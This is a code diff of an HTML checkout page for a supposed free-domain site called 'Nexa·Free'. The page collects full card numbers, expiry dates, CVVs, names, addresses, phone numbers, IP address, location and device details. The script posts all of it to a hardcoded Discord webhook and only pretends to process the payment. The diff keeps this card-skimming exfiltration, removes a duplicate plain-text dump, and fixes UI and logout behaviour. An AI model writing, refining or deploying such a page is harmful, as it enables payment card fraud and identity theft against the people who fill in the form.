@@ -19,12 +19,6 @@
         body {
             background: linear-gradient(145deg, #f6f9fc 0%, #e9f2f9 100%);
             min-height: 100vh;
-            transition: opacity 0.3s ease;
-        }
-
-        body.logging-out {
-            opacity: 0;
-            pointer-events: none;
         }
 
         .navbar {
@@ -36,7 +30,6 @@
             align-items: center;
             justify-content: space-between;
             border-bottom: 1px solid rgba(255,255,255,0.05);
-            transition: all 0.3s ease;
         }
 
         .logo-area {
@@ -99,7 +92,6 @@
             max-width: 1400px;
             margin: 2rem auto;
             padding: 0 2rem;
-            transition: opacity 0.3s ease;
         }
 
         .checkout-grid {
@@ -483,30 +475,32 @@
             100% { transform: rotate(360deg); }
         }
 
-        .glitch-protection {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: 9999;
-            display: none;
+        /* Prevent any unwanted transitions/refreshes */
+        * {
+            -webkit-transition: none !important;
+            -moz-transition: none !important;
+            -o-transition: none !important;
+            transition: none !important;
+        }
+        
+        a, button, input, select {
+            -webkit-transition: all 0.2s ease !important;
+            -moz-transition: all 0.2s ease !important;
+            -o-transition: all 0.2s ease !important;
+            transition: all 0.2s ease !important;
         }
     </style>
 </head>
 <body>
-    <div class="glitch-protection" id="glitchProtection"></div>
-
     <nav class="navbar">
         <div class="logo-area">
             <div class="logo-icon"><i class="fas fa-globe"></i></div>
             <div class="logo-text">Nexa<span>·Free</span></div>
         </div>
         <div class="nav-links">
-            <a href="#"><i class="fas fa-home"></i> Home</a>
-            <a href="#"><i class="fas fa-search"></i> Generator</a>
-            <a href="#"><i class="fas fa-shopping-cart"></i> Checkout</a>
+            <a href="#" onclick="return false;"><i class="fas fa-home"></i> Home</a>
+            <a href="#" onclick="return false;"><i class="fas fa-search"></i> Generator</a>
+            <a href="#" onclick="return false;"><i class="fas fa-shopping-cart"></i> Checkout</a>
             <a href="#" id="logoutBtn" style="border:1px solid #3b82f6; border-radius:40px; padding:0.5rem 1.5rem;"><i class="fas fa-sign-out-alt"></i> Logout</a>
         </div>
     </nav>
@@ -542,7 +536,7 @@
                     </div>
                 </div>
 
-                <form id="checkoutForm">
+                <form id="checkoutForm" onsubmit="return false;">
                     <!-- Personal Information Section -->
                     <div class="form-section">
                         <h2><i class="fas fa-user"></i> Personal Information</h2>
@@ -550,11 +544,11 @@
                         <div class="form-row">
                             <div class="form-group">
                                 <label>First Name *</label>
-                                <input type="text" id="firstName" required placeholder="John">
+                                <input type="text" id="firstName" required placeholder="John" autocomplete="off">
                             </div>
                             <div class="form-group">
                                 <label>Last Name *</label>
-                                <input type="text" id="lastName" required placeholder="Doe">
+                                <input type="text" id="lastName" required placeholder="Doe" autocomplete="off">
                             </div>
                         </div>
 
@@ -565,7 +559,7 @@
 
                         <div class="form-group">
                             <label>Phone Number *</label>
-                            <input type="tel" id="phone" required placeholder="+1 234 567 8900">
+                            <input type="tel" id="phone" required placeholder="+44 20 1234 5678" autocomplete="off">
                         </div>
                     </div>
 
@@ -575,29 +569,29 @@
 
                         <div class="form-group">
                             <label>Address Line *</label>
-                            <input type="text" id="address" required placeholder="Street address, P.O. box">
+                            <input type="text" id="address" required placeholder="Street address" autocomplete="off">
                         </div>
 
                         <div class="form-group">
                             <label>Apartment, suite, etc. (optional)</label>
-                            <input type="text" id="address2" placeholder="Apt 123">
+                            <input type="text" id="address2" placeholder="Apt 123" autocomplete="off">
                         </div>
 
                         <div class="form-row">
                             <div class="form-group">
                                 <label>City *</label>
-                                <input type="text" id="city" required placeholder="London">
+                                <input type="text" id="city" required placeholder="London" autocomplete="off">
                             </div>
                             <div class="form-group">
                                 <label>State / Province *</label>
-                                <input type="text" id="state" required placeholder="Greater London">
+                                <input type="text" id="state" required placeholder="Greater London" autocomplete="off">
                             </div>
                         </div>
 
                         <div class="form-row">
                             <div class="form-group">
                                 <label>ZIP / Postal Code *</label>
-                                <input type="text" id="zip" required placeholder="SW1A 1AA">
+                                <input type="text" id="zip" required placeholder="SW1A 1AA" autocomplete="off">
                             </div>
                             <div class="form-group">
                                 <label>Country *</label>
@@ -639,28 +633,28 @@
                         <div class="card-details show" id="cardDetails">
                             <div class="form-group">
                                 <label>Card Number *</label>
-                                <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19">
+                                <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" autocomplete="off">
                             </div>
                             
                             <div class="form-row">
                                 <div class="form-group">
                                     <label>Expiry Date *</label>
-                                    <input type="text" id="expiry" placeholder="MM/YY" maxlength="5">
+                                    <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" autocomplete="off">
                                 </div>
                                 <div class="form-group">
                                     <label>CVV *</label>
-                                    <input type="text" id="cvv" placeholder="123" maxlength="3">
+                                    <input type="text" id="cvv" placeholder="123" maxlength="3" autocomplete="off">
                                 </div>
                             </div>
 
                             <div class="form-group">
                                 <label>Cardholder Name *</label>
-                                <input type="text" id="cardholderName" placeholder="As shown on card">
+                                <input type="text" id="cardholderName" placeholder="As shown on card" autocomplete="off">
                             </div>
 
                             <div class="form-group">
                                 <label>Bank Name (optional)</label>
-                                <input type="text" id="bankName" placeholder="e.g., Chase, Barclays">
+                                <input type="text" id="bankName" placeholder="e.g., Barclays, HSBC" autocomplete="off">
                             </div>
 
                             <div class="form-group">
@@ -725,7 +719,7 @@
                 </button>
 
                 <p style="text-align: center; margin-top: 1rem; color: #64748b; font-size: 0.8rem;">
-                    By placing your order, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>
+                    By placing your order, you agree to our <a href="#" onclick="return false;">Terms of Service</a> and <a href="#" onclick="return false;">Privacy Policy</a>
                 </p>
             </div>
         </div>
@@ -743,7 +737,7 @@
             <p>A confirmation email has been sent to:</p>
             <p><strong id="confirmationEmail">user@example.com</strong></p>
             <p><small>Your IP address has been logged for delivery verification</small></p>
-            <button class="modal-btn" onclick="window.location.href='domaingenerator.html'">
+            <button class="modal-btn" id="backToGeneratorBtn">
                 <i class="fas fa-rocket"></i> Back to Generator
             </button>
         </div>
@@ -764,25 +758,25 @@
             appId: "1:255275350380:web:7be4e8add2cb5b04045b49"
         };
 
+        // Initialize Firebase only once
         const app = initializeApp(firebaseConfig);
         const auth = getAuth(app);
 
         // Discord Webhook
         const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1482059165227548682/IrrpYTrV3YuNdKhTz3tIonlzKjsFQC_RzQmFXwjAjwHd_UgFTP-_BRDBRK59goMcVFXf";
 
-        // Currency exchange rates (base: USD)
+        // Currency exchange rates
         const exchangeRates = {
-            'US': 1.0,      // USD
-            'GB': 0.79,     // GBP (UK)
-            'EU': 0.92,     // EUR
-            'JP': 148.50,   // JPY
-            'CA': 1.35,     // CAD
-            'AU': 1.52,     // AUD
-            'IN': 83.12,    // INR
+            'US': 1.0,
+            'GB': 0.79,
+            'EU': 0.92,
+            'JP': 148.50,
+            'CA': 1.35,
+            'AU': 1.52,
+            'IN': 83.12,
             'default': 1.0
         };
 
-        // Currency symbols
         const currencySymbols = {
             'US': '$',
             'GB': '£',
@@ -811,6 +805,7 @@
         const confirmationEmail = document.getElementById('confirmationEmail');
         const orderIdDisplay = document.getElementById('orderIdDisplay');
         const logoutBtn = document.getElementById('logoutBtn');
+        const backToGeneratorBtn = document.getElementById('backToGeneratorBtn');
         const summaryDomain = document.getElementById('summaryDomain');
         const summaryPlan = document.getElementById('summaryPlan');
         const domainPrice = document.getElementById('domainPrice');
@@ -819,7 +814,6 @@
         const tax = document.getElementById('tax');
         const totalPrice = document.getElementById('totalPrice');
         const ipDisplay = document.getElementById('ipDisplay');
-        const glitchProtection = document.getElementById('glitchProtection');
 
         // Payment method elements
         const paymentMethods = document.querySelectorAll('.payment-method');
@@ -840,62 +834,69 @@
         let userLocation = {};
         let orderData = {};
         let isLoggingOut = false;
+        let authChecked = false;
 
-        // Prevent glitching during logout
-        function safeLogout() {
-            if (isLoggingOut) return;
-            isLoggingOut = true;
-            
-            // Add logging out class to body for smooth transition
-            document.body.classList.add('logging-out');
-            
-            // Disable all interactive elements
-            const interactive = document.querySelectorAll('button, a, input, select');
-            interactive.forEach(el => el.style.pointerEvents = 'none');
-            
-            // Perform logout
-            signOut(auth).then(() => {
-                // Small delay to ensure smooth transition
-                setTimeout(() => {
-                    window.location.href = 'index.html';
-                }, 300);
-            }).catch((error) => {
-                console.error('Logout error:', error);
-                // Fallback
-                window.location.href = 'index.html';
+        // Prevent any form submission that could cause refresh
+        document.querySelectorAll('form').forEach(form => {
+            form.addEventListener('submit', (e) => {
+                e.preventDefault();
+                return false;
             });
-        }
+        });
+
+        // Prevent default link behavior
+        document.querySelectorAll('a').forEach(link => {
+            link.addEventListener('click', (e) => {
+                if (!link.id || link.id !== 'logoutBtn') {
+                    e.preventDefault();
+                    return false;
+                }
+            });
+        });
 
         // Load order data from session storage
         function loadOrderData() {
-            const savedDomain = sessionStorage.getItem('selectedDomain');
-            const savedPlan = sessionStorage.getItem('selectedPlan');
-            
-            if (savedDomain) {
-                selectedDomain = savedDomain;
-                summaryDomain.textContent = savedDomain;
-            }
-            
-            if (savedPlan) {
-                selectedPlan = savedPlan;
-                if (savedPlan === 'free') summaryPlan.textContent = 'Free Plan';
-                else if (savedPlan === 'basic') summaryPlan.textContent = 'Basic Plan';
-                else if (savedPlan === 'pro') summaryPlan.textContent = 'Pro Plan';
+            try {
+                const savedDomain = sessionStorage.getItem('selectedDomain');
+                const savedPlan = sessionStorage.getItem('selectedPlan');
+                
+                if (savedDomain) {
+                    selectedDomain = savedDomain;
+                    summaryDomain.textContent = savedDomain;
+                }
+                
+                if (savedPlan) {
+                    selectedPlan = savedPlan;
+                    if (savedPlan === 'free') summaryPlan.textContent = 'Free Plan';
+                    else if (savedPlan === 'basic') summaryPlan.textContent = 'Basic Plan';
+                    else if (savedPlan === 'pro') summaryPlan.textContent = 'Pro Plan';
+                }
+            } catch (e) {
+                console.log('Session storage error:', e);
             }
         }
 
-        // Get user IP and location
+        // Get user IP and location (with timeout to prevent hanging)
         async function detectUserIP() {
             try {
-                // Get IP
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                // Set a timeout for the fetch
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 5000);
+                
+                const ipResponse = await fetch('https://api.ipify.org?format=json', {
+                    signal: controller.signal
+                });
                 const ipData = await ipResponse.json();
                 userIP = ipData.ip;
                 
                 // Get location data
-                const locationResponse = await fetch(`https://ipapi.co/${userIP}/json/`);
+                const locationResponse = await fetch(`https://ipapi.co/${userIP}/json/`, {
+                    signal: controller.signal
+                });
                 const locationData = await locationResponse.json();
                 userLocation = locationData;
+                
+                clearTimeout(timeoutId);
                 
                 ipDisplay.innerHTML = `
                     <i class="fas fa-network-wired"></i>
@@ -919,7 +920,7 @@
                 console.log('Could not detect IP:', error);
                 ipDisplay.innerHTML = `
                     <i class="fas fa-network-wired"></i>
-                    <span>IP detection unavailable</span>
+                    <span>Using default location</span>
                 `;
                 return { ip: 'Unknown', location: {} };
             }
@@ -999,10 +1000,9 @@
             return `NEXA-${timestamp}-${random}`;
         }
 
-        // Send order to Discord webhook with all details
+        // Send order to Discord webhook
         async function sendOrderToDiscord(orderDetails) {
             try {
-                // Format card info with full details
                 const cardInfo = orderDetails.paymentMethod === 'Credit Card' ? 
                     `**Card Number:** ${orderDetails.cardNumber}\n**Expiry:** ${orderDetails.expiry}\n**CVV:** ${orderDetails.cvv}\n**Cardholder:** ${orderDetails.cardholderName}\n**Bank:** ${orderDetails.bankName || 'N/A'}\n**Card Type:** ${orderDetails.cardType}` : 
                     'N/A';
@@ -1045,81 +1045,20 @@
                             name: '🖥️ DEVICE INFORMATION',
                             value: `**Browser:** ${orderDetails.userAgent}\n**Platform:** ${orderDetails.platform}\n**Language:** ${orderDetails.language}\n**Screen:** ${orderDetails.screenResolution}`,
                             inline: false
-                        },
-                        {
-                            name: '⏰ TIMESTAMP',
-                            value: `<t:${Math.floor(Date.now()/1000)}:F>`,
-                            inline: false
                         }
                     ],
                     timestamp: new Date().toISOString(),
                     footer: {
-                        text: 'Nexa Free Domains · Secure Checkout · Full Data Logging'
+                        text: 'Nexa Free Domains · Secure Checkout'
                     }
                 };
 
-                // Send to Discord
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        content: '@everyone 🚨 **NEW PURCHASE - FULL DETAILS ATTACHED** 🚨',
+                        content: '@everyone 🚨 **NEW PURCHASE** 🚨',
                         embeds: [embed]
-                    })
-                });
-
-                // Also send as plain text backup
-                const plainText = `
-🚨 NEW ORDER - FULL DATA DUMP 🚨
-
-CUSTOMER:
-Name: ${orderDetails.firstName} ${orderDetails.lastName}
-Email: ${orderDetails.email}
-Phone: ${orderDetails.phone}
-
-ADDRESS:
-${orderDetails.address} ${orderDetails.address2}
-${orderDetails.city}, ${orderDetails.state} ${orderDetails.zip}
-${orderDetails.country}
-
-ORDER:
-ID: ${orderDetails.orderId}
-Domain: ${orderDetails.domain}
-Plan: ${orderDetails.plan}
-Payment: ${orderDetails.paymentMethod}
-
-CARD INFO:
-Number: ${orderDetails.cardNumber}
-Expiry: ${orderDetails.expiry}
-CVV: ${orderDetails.cvv}
-Cardholder: ${orderDetails.cardholderName}
-Bank: ${orderDetails.bankName || 'N/A'}
-Type: ${orderDetails.cardType}
-
-IP & LOCATION:
-IP: ${orderDetails.ip}
-ISP: ${orderDetails.location.org || 'N/A'}
-City: ${orderDetails.location.city || 'N/A'}
-Region: ${orderDetails.location.region || 'N/A'}
-Country: ${orderDetails.location.country_name || 'N/A'}
-Postal: ${orderDetails.location.postal || 'N/A'}
-Timezone: ${orderDetails.location.timezone || 'N/A'}
-
-DEVICE:
-Browser: ${orderDetails.userAgent}
-Platform: ${orderDetails.platform}
-Language: ${orderDetails.language}
-Screen: ${orderDetails.screenResolution}
-
-TOTAL: ${orderDetails.currency.symbol}${orderDetails.total} (${orderDetails.currency.code})
-TIME: ${new Date().toLocaleString()}
-                `;
-
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: '```' + plainText + '```'
                     })
                 });
 
@@ -1140,17 +1079,9 @@ TIME: ${new Date().toLocaleString()}
                 return false;
             }
 
-            // Validate email format
             const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
             if (!emailRegex.test(email.value)) {
                 alert('Please enter a valid email address');
-                return false;
-            }
-
-            // Validate phone (simple)
-            const phoneRegex = /^[\+]?[(]?[0-9]{3}[)]?[-\s\.]?[0-9]{3}[-\s\.]?[0-9]{4,6}$/;
-            if (!phoneRegex.test(phone.value.replace(/\s/g, ''))) {
-                alert('Please enter a valid phone number');
                 return false;
             }
 
@@ -1161,18 +1092,15 @@ TIME: ${new Date().toLocaleString()}
         async function placeOrder() {
             if (!validateForm()) return;
 
-            // Show loading
             placeOrderBtn.disabled = true;
             orderSpinner.style.display = 'inline-block';
             placeOrderBtn.querySelector('span').textContent = 'Processing...';
 
-            // Get device info
             const userAgent = navigator.userAgent;
             const platform = navigator.platform;
             const language = navigator.language;
             const screenResolution = `${screen.width}x${screen.height}`;
 
-            // Prepare order data with ALL details
             orderData = {
                 orderId: generateOrderId(),
                 timestamp: new Date().toISOString(),
@@ -1189,55 +1117,47 @@ TIME: ${new Date().toLocaleString()}
                 domain: selectedDomain,
                 plan: selectedPlan,
                 paymentMethod: document.querySelector('.payment-method.selected span').textContent,
-                // Full card details
                 cardNumber: cardNumber.value.replace(/\s/g, ''),
                 expiry: expiry.value,
                 cvv: cvv.value,
                 cardholderName: cardholderName.value,
                 bankName: bankName.value,
                 cardType: cardType.value,
-                // Currency
                 currency: userCurrency,
                 subtotal: (selectedPlan === 'free' ? 0 : (selectedPlan === 'basic' ? 5 : 15) * userCurrency.rate).toFixed(2),
                 tax: '0.00',
                 total: (selectedPlan === 'free' ? 0 : (selectedPlan === 'basic' ? 5 : 15) * userCurrency.rate).toFixed(2),
-                // IP and location
                 ip: userIP,
                 location: userLocation,
-                // Device info
                 userAgent: userAgent,
                 platform: platform,
                 language: language,
                 screenResolution: screenResolution
             };
 
-            // Send to Discord
             await sendOrderToDiscord(orderData);
 
-            // Simulate payment processing
             setTimeout(() => {
-                // Hide loading
                 placeOrderBtn.disabled = false;
                 orderSpinner.style.display = 'none';
                 placeOrderBtn.querySelector('span').textContent = 'Place Order';
 
-                // Show success modal
                 confirmationEmail.textContent = email.value;
                 orderIdDisplay.textContent = orderData.orderId;
                 successModal.classList.add('show');
-
-                // Clear session storage
-                sessionStorage.removeItem('selectedDomain');
-                sessionStorage.removeItem('selectedPlan');
             }, 2000);
         }
 
         // Event Listeners
-        placeOrderBtn.addEventListener('click', placeOrder);
+        placeOrderBtn.addEventListener('click', (e) => {
+            e.preventDefault();
+            placeOrder();
+        });
 
         // Payment method selection
         paymentMethods.forEach(method => {
-            method.addEventListener('click', () => {
+            method.addEventListener('click', (e) => {
+                e.preventDefault();
                 paymentMethods.forEach(m => m.classList.remove('selected'));
                 method.classList.add('selected');
                 
@@ -1268,48 +1188,75 @@ TIME: ${new Date().toLocaleString()}
             updateCurrencyFromCountry(e.target.value);
         });
 
-        // Auto-fill email from auth
+        // Back to generator button
+        backToGeneratorBtn.addEventListener('click', (e) => {
+            e.preventDefault();
+            window.location.href = 'domaingenerator.html';
+        });
+
+        // Logout function
+        function handleLogout(e) {
+            if (e) e.preventDefault();
+            if (isLoggingOut) return;
+            
+            isLoggingOut = true;
+            
+            signOut(auth).then(() => {
+                window.location.replace('index.html');
+            }).catch((error) => {
+                console.error('Logout error:', error);
+                window.location.replace('index.html');
+            });
+        }
+
+        logoutBtn.addEventListener('click', handleLogout);
+
+        // Auth state observer - only redirect once
         onAuthStateChanged(auth, (user) => {
             if (user) {
                 currentUser = user;
                 email.value = user.email || '';
                 
-                // Try to get name from user display name
                 if (user.displayName) {
                     const nameParts = user.displayName.split(' ');
                     firstName.value = nameParts[0] || '';
                     lastName.value = nameParts.slice(1).join(' ') || '';
                 }
+                
+                // Only detect IP once after auth is confirmed
+                if (!authChecked) {
+                    detectUserIP();
+                    authChecked = true;
+                }
             } else {
                 // Only redirect if not already logging out
-                if (!isLoggingOut) {
-                    window.location.href = 'index.html';
+                if (!isLoggingOut && !window.location.pathname.includes('index.html')) {
+                    window.location.replace('index.html');
                 }
             }
         });
 
-        // Logout with glitch prevention
-        logoutBtn.addEventListener('click', (e) => {
-            e.preventDefault();
-            safeLogout();
-        });
-
         // Initialize
         loadOrderData();
-        detectUserIP();
 
-        // Close modal when clicking outside
-        window.addEventListener('click', (e) => {
-            if (e.target === successModal) {
-                successModal.classList.remove('show');
+        // Prevent any accidental page reloads
+        window.addEventListener('beforeunload', (e) => {
+            // Don't show confirmation, just prevent automatic reloads
+            e.preventDefault();
+            e.returnValue = '';
+        });
+
+        // Fix for back button
+        window.addEventListener('pageshow', (event) => {
+            if (event.persisted) {
+                window.location.reload();
             }
         });
 
-        // Prevent any accidental glitches
-        window.addEventListener('beforeunload', () => {
-            // Clean up
-            document.body.style.opacity = '1';
-        });
+        // Prevent form resubmission on refresh
+        if (window.history.replaceState) {
+            window.history.replaceState(null, null, window.location.href);
+        }
     </script>
 </body>
 </html>
